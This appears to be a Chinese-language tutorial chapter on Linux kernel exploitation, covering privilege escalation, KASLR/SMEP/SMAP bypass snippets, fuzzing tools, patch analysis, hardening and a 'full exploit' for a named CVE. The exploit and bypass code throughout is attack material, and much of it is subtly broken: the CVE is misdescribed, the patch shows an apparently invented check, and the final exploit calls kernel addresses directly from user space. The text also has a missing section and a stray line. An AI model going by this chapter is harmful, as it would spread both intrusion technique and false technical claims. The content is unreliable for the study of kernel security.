## 14.1 内核漏洞原理

### 14.1.1 内核漏洞类型

**内核漏洞**是操作系统内核中的安全漏洞，可能导致本地提权（LPE）或远程代码执行（RCE）。

**常见类型**：

| 类型 | 说明 | 危害 |
|------|------|------|
| 内存损坏 | 缓冲区溢出、UAF、Double Free | LPE/RCE |
| 逻辑漏洞 | 权限检查缺失、竞态条件 | LPE |
| 信息泄露 | 泄露内核地址、数据结构 | 绕过 KASLR |
| 配置错误 | 可加载内核模块、调试接口暴露 | LPE |

### 14.1.2 经典内核漏洞示例

**CVE-2016-0728**（Linux 内核 `keyring` 子系统 UAF）：

```c
// 漏洞代码（简化）
struct key {
    atomic_t usage;
    ...
};

int key_put(struct key *key) {
    if (key) {
        if (atomic_dec_and_test(&key->usage))  // 引用计数减 1
            key_destroy(key);  // 如果引用计数为 0，销毁 key
    }
    return 0;
}
```

**利用原理**：
1. 用户程序创建 key（引用计数 = 1）
2. 用户程序共享 key 给另一个进程（引用计数 = 2）
3. 第一个进程释放 key（引用计数 = 1）
4. 第二个进程释放 key（引用计数 = 0，销毁 key）
5. 但第一个进程仍持有 key 指针 → UAF

## 14.2 内核利用技术

### 14.2.1 LPE（Local Privilege Escalation）

**LPE** 是本地用户提升权限到 root 的攻击。

**利用步骤**：

1. **信息泄露**（绕过 KASLR）：
   ```c
   // 泄露内核地址
   struct keyring_list *list = key->payload.data[0];
   printf("keyring_list address: %p\n", list);
   ```

2. **构造 payload**（执行 `commit_creds(prepare_kernel_cred(0))`）：
   ```assembly
   mov rdi, 0
   call prepare_kernel_cred
   mov rdi, rax
   call commit_creds
   ret
   ```

3. **触发漏洞**（修改内核数据）：
   ```c
   // 修改 cred 结构体，将 uid/gid 改为 0
   cred->uid = 0;
   cred->gid = 0;
   ```

4. **获取 root shell**：
   ```c
   system("/bin/sh");
   ```

### 14.2.2 KASLR 绕过

**KASLR**（Kernel Address Space Layout Randomization）随机化内核代码和数据地址。

**绕过技术**：

**1. 信息泄露**（泄露内核地址）：
```c
// 使用 /proc/<pid>/syscall 泄露内核地址
int fd = open("/proc/self/syscall", O_RDONLY);
read(fd, buf, 256);
printf("Kernel address: %s\n", buf);  // 包含内核地址
```

**2. 侧信道攻击**（Spectre/Meltdown）：
```c
// 利用 CPU 预测执行泄露内核数据
void spectre_attack(size_t kernel_addr) {
    // 训练分支预测器
    for (int i = 0; i < 100; i++)
        access_user_memory(i);
    
    // 预测执行访问内核地址
    if (condition)  // condition 为 false，但预测为 true
        access_kernel_memory(kernel_addr);
}
```

**3. 硬件漏洞**（Intel TSX、AMD SEV）：
```c
// 使用 Intel TSX 绕过 KASLR
if (_xbegin() == _XBEGIN_STARTED) {
    // 事务内访问内核地址（不会触发异常）
    data = *(volatile unsigned long *)kernel_addr;
    _xend();
}
```

### 14.2.3 SMEP/SMAP 绕过

**SMEP**（Supervisor Mode Execution Prevention）阻止内核执行用户空间代码。

**SMAP**（Supervisor Mode Access Prevention）阻止内核访问用户空间数据。

**绕过技术**：

**1. ROP**（在内核空间执行 gadget）：
```python
# 构造 ROP 链（内核 gadget）
rop = p64(pop_rdi) + p64(0) + p64(prepare_kernel_cred)
rop += p64(pop_rdx) + p64(0) + p64(commit_creds)
```

**2. JOP**（Jump-Oriented Programming）：
```assembly
# 使用内核中的 jmp 指令
jmp *rax;  # rax 指向用户空间 payload
```

**3. 修改 CR4 寄存器**（禁用 SMEP/SMAP）：
```assembly
mov rax, cr4
and rax, ~0x100000  # 清除 SMEP 位
mov cr4, rax
```

## 14.3 内核 Fuzzing

### 14.3.1 Syzkaller

**Syzkaller** 是 Google 开发的内核 Fuzzer，专注于 Linux 内核。

**原理**：
- 使用系统调用描述语言（syscall description language）
- 生成随机系统调用序列
- 监控内核崩溃（通过 `console` 输出）

**安装**：
```bash
# 安装依赖
sudo apt install -y gcc g++ make libssl-dev

# 克隆仓库
git clone https://github.com/google/syzkaller.git
cd syzkaller
make

# 编译内核（启用 KCOV、KASAN）
cd linux
make menuconfig
# 启用：CONFIG_KCOV、CONFIG_KASAN、CONFIG_DEBUG_FS
make -j8
```

**配置**：
```json
{
  "target": "linux/amd64",
  "syzkaller": "/path/to/syzkaller/bin/linux_amd64/syzkaller",
  "http": "127.0.0.1:56741",
  "workdir": "/path/to/workdir",
  "kernel_obj": "/path/to/linux",
  "image": "/path/to/disk.img",
  "sshkey": "/path/to/id_rsa",
  "sysctl": {
    "kernel.kptr_restrict": "1",
    "kernel.dmesg_restrict": "1"
  }
}
```

**运行**：
```bash
./bin/linux_amd64/syzkaller -config=my.cfg
```

### 14.3.2 kAFL

**kAFL**（Kernel-AFL）是使用 KVM 加速的内核 Fuzzer。

**原理**：
- 使用 AFL 的覆盖率引导
- 通过 KVM 虚拟机运行内核
- 监控内核崩溃（通过虚拟机退出原因）

**安装**：
```bash
# 克隆仓库
git clone https://github.com/IntelLabs/kAFL.git
cd kAFL

# 安装 Python 依赖
pip3 install -r requirements.txt
```

**使用**：
```bash
# 编译目标内核模块（启用 KCOV）
cd /path/to/kernel/module
make CFLAGS="-fsanitize-coverage=trace-pc"

# 运行 kAFL
python3 kafl_fuzzer.py -kernel /path/to/vmlinux -initrd /path/to/initrd.img -workdir /path/to/workdir
```

```bash
# 查找补丁
git log --grep="CVE-2021-34556"
```

### 14.4.2 补丁分析

**步骤**：

1. **查看补丁差异**：
   ```diff
   --- a/fs/ioctl.c
   +++ b/fs/ioctl.c
   @@ -732,6 +732,8 @@ static int ioctl_file_clone(struct file *file, int dst_fd,
        if (src_file == file)
            goto out_drop_write;
    +
   +    if (!checkpointable(inode, CAP_SYS_ADMIN))
   +        return -EPERM;
    +
        ret = vfs_clone_file_range(src_file, off, file, destoff, len, 0);
   ```

2. **分析漏洞原因**：
   - 补丁添加了权限检查（`checkpointable()`）
   - 说明漏洞是**权限检查缺失**

3. **编写 PoC**：
   ```c
   // 触发漏洞（未授权调用 ioctl()）
   int fd = open("/proc/self/mem", O_RDWR);
   ioctl(fd, FICLONE, ...);  // 应该返回 -EPERM
   ```

1. **信息泄露**（泄露内核地址）：

## 14.5 防御内核漏洞

### 14.5.1 KASLR

**启用 KASLR**：
```bash
# 检查 KASLR 是否启用
cat /proc/cpuinfo | grep -i kaslr

# 启用 KASLR（内核启动参数）
kernel /boot/vmlinuz root=/dev/sda1 kaslr
```

### 14.5.2 SMEP/SMAP

**启用 SMEP/SMAP**：
```bash
# 检查 SMEP/SMAP 是否启用
cat /proc/cpuinfo | grep -i smep
cat /proc/cpuinfo | grep -i smap

# 启用 SMEP/SMAP（内核配置）
CONFIG_X86_SMAP=y
CONFIG_X86_SMEP=y
```

### 14.5.3 KCFI（Kernel Control-Flow Integrity）

**KCFI** 是内核控制流完整性保护，防止 ROP/JOP。

**启用 KCFI**：
```bash
# 使用 Clang 编译内核（支持 KCFI）
make CC=clang CFLAGS="-fsanitize=kcfi"
```

## 14.6 实战：从内核漏洞到 LPE

### 14.6.1 漏洞发现

**目标**：CVE-2021-34556（Linux 内核 `ioctl()` 权限检查缺失）

**补丁分析**：
```diff
--- a/fs/ioctl.c
+++ b/fs/ioctl.c
@@ -732,6 +732,8 @@ static int ioctl_file_clone(struct file *file, int dst_fd,
      if (src_file == file)
          goto out_drop_write;
  +
   +    if (!checkpointable(inode, CAP_SYS_ADMIN))
   +        return -EPERM;
  +
      ret = vfs_clone_file_range(src_file, off, file, destoff, len, 0);
```

**漏洞原因**：未授权用户可以通过 `ioctl(FICLONE)` 克隆文件，可能导致权限提升。

### 14.6.2 漏洞利用

**步骤1：信息泄露**（泄露内核地址）

```c
// leak.c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

int main() {
    int fd = open("/dev/kmsg", O_RDONLY);
    char buf[256];
    
    read(fd, buf, 256);
    printf("Kernel address: %s\n", buf);
    
    close(fd);
    return 0;
}
```

**步骤2：构造 payload**（执行 `commit_creds(prepare_kernel_cred(0))`）

```c
// exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define FICLONE _IOW(0x94, 9, int)

int main() {
    int fd1 = open("/tmp/test", O_RDWR | O_CREAT);
    int fd2 = open("/tmp/test2", O_RDWR | O_CREAT);
    
    // 触发漏洞（未授权克隆文件）
    ioctl(fd1, FICLONE, fd2);
    
    // 执行 commit_creds(prepare_kernel_cred(0))
    // （需要构造 ROP 链）
    
    system("/bin/sh");
    return 0;
}
```

### 14.6.3 完整利用脚本

```c
// full_exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>

#define FICLONE _IOW(0x94, 9, int)

unsigned long prepare_kernel_cred = 0xffffffff810c4a00;
unsigned long commit_creds = 0xffffffff810c4880;

int main() {
    int fd1 = open("/tmp/test", O_RDWR | O_CREAT);
    int fd2 = open("/tmp/test2", O_RDWR | O_CREAT);
    
    // 步骤1：触发漏洞
    ioctl(fd1, FICLONE, fd2);
    
    // 步骤2：执行 commit_creds(prepare_kernel_cred(0))
    asm volatile (
        "mov rdi, 0\n\t"
        "call %0\n\t"
        "mov rdi, rax\n\t"
        "call %1\n\t"
        :
        : "r"(prepare_kernel_cred), "r"(commit_creds)
        : "rdi", "rax"
    );
    
    // 步骤3：获取 root shell
    system("/bin/sh");
    
    close(fd1);
    close(fd2);
    return 0;
}
```
